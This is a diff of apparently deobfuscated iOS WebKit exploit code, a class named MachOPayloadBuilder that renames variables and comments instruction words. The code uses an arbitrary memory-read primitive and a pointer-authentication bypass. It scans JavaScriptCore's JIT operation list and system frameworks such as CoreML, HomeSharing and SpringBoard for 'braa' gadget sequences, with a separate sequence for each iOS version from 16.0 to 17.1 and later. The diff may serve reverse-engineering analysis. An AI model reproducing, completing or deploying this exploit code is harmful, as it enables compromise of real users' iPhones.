@@ -1343,36 +1343,36 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             H = new Offset64(platformModule.platformState.Pn ? 1 : 0, 0);
         if (null !== platformModule.platformState.caller && !0 === platformModule.platformState.qn) {
             const A = platformModule.platformState.pacBypass,
-                g = platformModule.platformState.exploitPrimitive,
+                exploitPrimitive = platformModule.platformState.exploitPrimitive,
                 D = platformModule.cr(),
                 M = D.Sh(),
                 C = D.bh("__TEXT", "__text"),
                 I = D.dlsym("_ZN3JSC16jitOperationListE"),
-                w = g.readRawBigInt(I),
-                Q = g.read32(w - 4),
+                w = exploitPrimitive.readRawBigInt(I),
+                Q = exploitPrimitive.read32(w - 4),
                 B = function (A, D) {
                     for (let M = 0; M < Q; M++) {
-                        const I = g.readRawBigInt(w + 16 * M),
+                        const I = exploitPrimitive.readRawBigInt(w + 16 * M),
                             Q = 8;
-                        if (C.qe <= I && I <= C.qe + C.Oo - Q && g.read32(I) === A && g.read32(I + 4) === D) return g.readInt64FromOffset(w + 16 * M + 8);
+                        if (C.qe <= I && I <= C.qe + C.Oo - Q && exploitPrimitive.read32(I) === A && exploitPrimitive.read32(I + 4) === D) return exploitPrimitive.readInt64FromOffset(w + 16 * M + 8);
                     }
                     return utilityModule.Int64.fromNumber(0);
                 }(0xd289222d, 0xd71f0c4d);
             if (B.Et()) throw new Error("B.Et()");
             K = new Offset64(B.it, B.et);
             const N = 0x4911,
-                E = function (A, D) {
-                    const C = M.Jh(A)._h("__TEXT", "__text"),
-                        I = C.qe + C.Oo - 4 * D.length;
+                findBRAAGadget = function (filePath, needle) {
+                    const C = M.Jh(filePath)._h("__TEXT", "__text"),
+                        I = C.qe + C.Oo - 4 * needle.length;
                     for (let A = C.qe; A <= I; A += 4) {
                         let M = !0;
-                        for (let C = 0; C < D.length; C++)
-                            if (g.read32(A + 4 * C) !== D[C]) {
+                        for (let C = 0; C < needle.length; C++)
+                            if (exploitPrimitive.read32(A + 4 * C) !== needle[C]) {
                                 M = !1;
                                 break;
                             } if (M) return A;
                     }
-                    window.log("ERROR: returning not found of " + A + ": " + D);
+                    window.log("ERROR: gadget not found in " + filePath + ": " + needle);
                     return 0;
                 },
                 T = function (A, g, D) {
@@ -1386,12 +1386,12 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             if (platformModule.platformState.iOSVersion >= 170100) {
 
                 // iOS ≥ 17.1
-                U = E(
+                U = findBRAAGadget(
                     "/System/Library/PrivateFrameworks/HomeSharing.framework/HomeSharing",
                     [
                         0xaa0c03e8,
                         0xd29b8c11,
-                        0xd71f0951
+                        0xd71f0951  // braa x10, x17
                     ]
 
                 );
@@ -1402,12 +1402,12 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 170000) {
 
                 // iOS 17.0
-                U = E(
+                U = findBRAAGadget(
                     "/System/Library/Frameworks/CoreML.framework/CoreML",
                     [
                         0xaa0c03e8,
                         0xd2909cd1,
-                        0xd71f0951
+                        0xd71f0951  // braa x10, x17
                     ]
 
                 );
@@ -1417,12 +1417,12 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 160400) {
 
                 // iOS ≥ 16.4
-                U = E(
+                U = findBRAAGadget(
                     "/System/Library/Frameworks/CoreML.framework/CoreML",
                     [
                         0xaa0c03e8,
                         0xd29e65b1,
-                        0xd71f0951
+                        0xd71f0951  // braa x10, x17
                     ]
 
                 );
@@ -1432,12 +1432,12 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 160000) {
 
                 // iOS 16.0 – 16.3
-                U = E(
+                U = findBRAAGadget(
                     "/System/Library/PrivateFrameworks/HomeSharing.framework/HomeSharing",
                     [
                         0xaa0c03e8,
                         0xd2935db1,
-                        0xd71f0951
+                        0xd71f0951  // braa x10, x17
                     ]
 
                 );
@@ -1447,12 +1447,12 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else {
 
                 // Older systems fallback
-                U = E(
+                U = findBRAAGadget(
                     "/System/Library/Frameworks/MediaToolbox.framework/MediaToolbox",
                     [
                         0xaa0c03e8,
                         0xd29dce11,
-                        0xd71f0951
+                        0xd71f0951  // braa x10, x17
                     ]
 
                 );
@@ -1471,9 +1471,13 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             if (platformModule.platformState.iOSVersion >= 170100) {
 
                 // iOS ≥ 17.1
-                s = E(
+                s = findBRAAGadget(
                     "/System/Library/PrivateFrameworks/PassKitCore.framework/PassKitCore",
-                    [0xaa0b03e2, 0xd28c7331, 0xd71f09d1]
+                    [
+                        0xaa0b03e2,
+                        0xd28c7331,
+                        0xd71f09d1  // braa x14, x17
+                    ]
 
                 );
 
@@ -1483,9 +1487,13 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 170000) {
 
                 // iOS 17.0
-                s = E(
+                s = findBRAAGadget(
                     "/System/Library/PrivateFrameworks/AppleMediaServices.framework/AppleMediaServices",
-                    [0xaa0b03e2, 0xd29bc671, 0xd71f09d1]
+                    [
+                        0xaa0b03e2,
+                        0xd29bc671,
+                        0xd71f09d1  // braa x14, x17
+                    ]
 
                 );
 
@@ -1494,9 +1502,13 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 160400) {
 
                 // iOS ≥ 16.4
-                s = E(
+                s = findBRAAGadget(
                     "/System/Library/PrivateFrameworks/SpringBoard.framework/SpringBoard",
-                    [0xaa0f03e2, 0xd29336f1, 0xd71f09d1]
+                    [
+                        0xaa0f03e2,
+                        0xd29336f1,
+                        0xd71f09d1  // braa x14, x17
+                    ]
 
                 );
 
@@ -1505,9 +1517,16 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else if (platformModule.platformState.iOSVersion >= 160000) {
 
                 // iOS 16.0 – 16.3
-                s = E(
+                s = findBRAAGadget(
                     "/System/Library/Frameworks/CoreML.framework/CoreML",
-                    [0xaa0f03e2, 0x528b636d, 0x72a539cd, 0xaa0903ee, 0xd2820371, 0xd71f0991]
+                    [
+                        0xaa0f03e2,
+                        0x528b636d,
+                        0x72a539cd,
+                        0xaa0903ee, 
+                        0xd2820371,
+                        0xd71f0991  // braa x12, x17
+                    ]
 
                 );
 
@@ -1516,9 +1535,14 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
             } else {
 
                 // Older systems fallback
-                s = E(
+                s = findBRAAGadget(
                     "/System/Library/Frameworks/MediaToolbox.framework/MediaToolbox",
-                    [0xaa0f03e2, 0xaa0c03e8, 0xd29dce11, 0xd71f0951]
+                    [
+                        0xaa0f03e2,
+                        0xaa0c03e8,
+                        0xd29dce11,
+                        0xd71f0951  // braa x10, x17
+                    ]
 
                 );
 
